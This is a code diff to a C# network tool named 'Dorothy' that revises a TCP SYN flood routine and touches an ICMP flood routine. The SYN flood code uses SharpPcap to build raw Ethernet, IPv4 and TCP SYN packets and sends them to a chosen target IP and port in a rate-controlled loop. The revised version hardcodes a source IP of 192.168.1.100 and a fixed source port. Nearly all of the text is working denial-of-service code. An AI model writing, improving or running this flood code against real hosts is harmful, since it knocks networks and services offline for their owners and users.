@@ -9,7 +9,6 @@ using System.Diagnostics; // Added for Stopwatch
 using System.Security.Principal; // Added for WindowsIdentity and WindowsPrincipal
 using SharpPcap;
 using PacketDotNet;
-using PacketDotNet.Utils;
 
 namespace Dorothy
 {
@@ -97,70 +96,35 @@ namespace Dorothy
             _stopAttack = false;
             log($"Debug: Entering StartTcpSynFlood method");
 
-            return Task.Run(async () =>
+            return Task.Run(() =>
             {
-                IInjectionDevice? device = null;
+                IInjectionDevice? device = null; // Declare device outside try block
+
                 try
                 {
-                    log($"Debug: Using SharpPcap for TCP SYN flood");
-
-                    var devices = SharpPcap.LibPcap.LibPcapLiveDeviceList.Instance;
+                    var devices = CaptureDeviceList.Instance;
                     if (devices.Count < 1)
                     {
                         log("Error: No devices were found on this machine");
                         return Task.CompletedTask;
                     }
 
-                    // Select the first suitable device that can inject packets, is not a Bluetooth device, and has an IPv4 address
-                    foreach (var dev in devices)
-                    {
-                        var injectionDevice = dev as IInjectionDevice;
-                        if (injectionDevice == null)
-                            continue;
-
-                        var libPcapDevice = dev as SharpPcap.LibPcap.LibPcapLiveDevice;
-                        if (libPcapDevice == null)
-                            continue;
-
-                        // Exclude Bluetooth devices
-                        if (libPcapDevice.Description.Contains("Bluetooth", StringComparison.OrdinalIgnoreCase))
-                            continue;
-
-                        var addresses = libPcapDevice.Addresses;
-                        foreach (var addr in addresses)
-                        {
-                            if (addr.Addr.ipAddress != null && addr.Addr.ipAddress.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
-                            {
-                                device = injectionDevice;
-                                break;
-                            }
-                        }
-                        if (device != null)
-                            break;
-                    }
-
+                    device = devices[0] as IInjectionDevice; // Attempt to cast to IInjectionDevice
                     if (device == null)
                     {
-                        log("Error: Unable to find an operational network device with an IPv4 address that is not Bluetooth");
+                        log("Error: Selected device is not an injection device or is null");
                         return Task.CompletedTask;
                     }
 
-                    log($"Debug: Selected device: {device.Description}");
                     device.Open(DeviceModes.Promiscuous, 1000);
 
-                    var libPcapDeviceFinal = device as SharpPcap.LibPcap.LibPcapLiveDevice;
-                    var localIp = GetLocalIpAddress(libPcapDeviceFinal);
-                    if (localIp == null)
+                    var srcIp = IPAddress.Parse("192.168.1.100");
+                    if (!IPAddress.TryParse(targetIp, out IPAddress? dstIp))
                     {
-                        log("Error: Unable to determine the local IP address from the selected device");
+                        log($"Error: Invalid target IP address: {targetIp}");
                         return Task.CompletedTask;
                     }
-
-                    var srcIp = IPAddress.Parse(localIp);
-                    var dstIp = IPAddress.Parse(targetIp);
-                    var srcPort = GetAvailablePort();
-
-                    log($"Debug: Source IP: {srcIp}, Destination IP: {dstIp}, Source Port: {srcPort}");
+                    var srcPort = 12345;
 
                     long packetsSent = 0;
                     long bytesPerSecond = mbps * 125000L;
@@ -173,36 +137,29 @@ namespace Dorothy
                     {
                         try
                         {
-                            if (libPcapDeviceFinal == null)
-                            {
-                                log("Error: libPcapDeviceFinal is null.");
-                                return Task.CompletedTask;
-                            }
-
                             EthernetPacket ethernetPacket = new EthernetPacket(
-                                libPcapDeviceFinal.MacAddress,
-                                PhysicalAddress.Parse("FF-FF-FF-FF-FF-FF"),
-                                EthernetType.IPv4);
+                                device.MacAddress, 
+                                PhysicalAddress.Parse("FF-FF-FF-FF-FF-FF"), 
+                                EthernetType.IPv4
+                            );
 
                             IPv4Packet ipPacket = new IPv4Packet(srcIp, dstIp)
                             {
                                 TimeToLive = 64,
-                                Protocol = (PacketDotNet.ProtocolType)System.Net.Sockets.ProtocolType.Tcp
+                                Protocol = PacketDotNet.ProtocolType.Tcp // Fully qualified ProtocolType
                             };
 
                             TcpPacket tcpPacket = new TcpPacket((ushort)srcPort, (ushort)targetPort)
                             {
-                                SequenceNumber = (uint)new Random().Next(1, int.MaxValue),
-                                WindowSize = 8192
-                                // Removed TcpFlags to fix the error
+                                SequenceNumber = 100,
+                                WindowSize = 8192,
+                                Flags = PacketDotNet.TcpFlags.Syn // Fully qualified TcpFlags
                             };
-                            tcpPacket.Synchronize = true; // Set SYN flag
 
                             ipPacket.PayloadPacket = tcpPacket;
                             ethernetPacket.PayloadPacket = ipPacket;
 
                             device.SendPacket(ethernetPacket);
-
                             packetsSent++;
                             bytesSent += ethernetPacket.Bytes.Length;
 
@@ -224,38 +181,28 @@ namespace Dorothy
                                 if (actualMbps > mbps)
                                 {
                                     log($"Debug: Rate exceeded, sleeping for 10ms");
-                                    await Task.Delay(10);
+                                    Thread.Sleep(10);
                                 }
                             }
 
                             // Calculate the delay needed to match the desired Mbps
                             double delay = (ethernetPacket.Bytes.Length * 8.0 / (mbps * 1_000_000.0)) * 1000.0;
-                            if (delay > 0)
-                            {
-                                await Task.Delay((int)delay);
-                            }
+                            Thread.Sleep((int)delay);
                         }
                         catch (Exception ex)
                         {
                             log($"TCP SYN Flood error: {ex.Message}");
-                            log($"Debug: Stack Trace: {ex.StackTrace}");
                         }
                     }
                 }
                 catch (Exception ex)
                 {
                     log($"TCP SYN Flood error: {ex.Message}");
-                    log($"Debug: Stack Trace: {ex.StackTrace}");
                 }
                 finally
                 {
-                    if (device != null)
-                    {
-                        device.Close();
-                        device.Dispose();
-                        log("Debug: Network device closed");
-                    }
                     log("Debug: TCP SYN Flood attack stopped.");
+                    device?.Close(); // Safely close the device if it's not null
                 }
 
                 return Task.CompletedTask;
@@ -273,7 +220,7 @@ namespace Dorothy
                 try
                 {
                     log($"Debug: Creating raw socket for ICMP");
-                    using (Socket icmpSocket = new Socket(AddressFamily.InterNetwork, SocketType.Raw, System.Net.Sockets.ProtocolType.Icmp))
+                    using (Socket icmpSocket = new Socket(AddressFamily.InterNetwork, SocketType.Raw, ProtocolType.Icmp))
                     {
                         IPEndPoint targetEndpoint = new IPEndPoint(IPAddress.Parse(targetIp), 0);
                         byte[] buffer = new byte[1024]; // 1KB packet size
@@ -354,7 +301,7 @@ namespace Dorothy
             var addresses = device.Addresses;
             foreach (var addr in addresses)
             {
-                if (addr.Addr.ipAddress != null && addr.Addr.ipAddress.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
+                if (addr.Addr.ipAddress != null && addr.Addr.ipAddress.AddressFamily == AddressFamily.InterNetwork)
                 {
                     return addr.Addr.ipAddress.ToString();
                 }
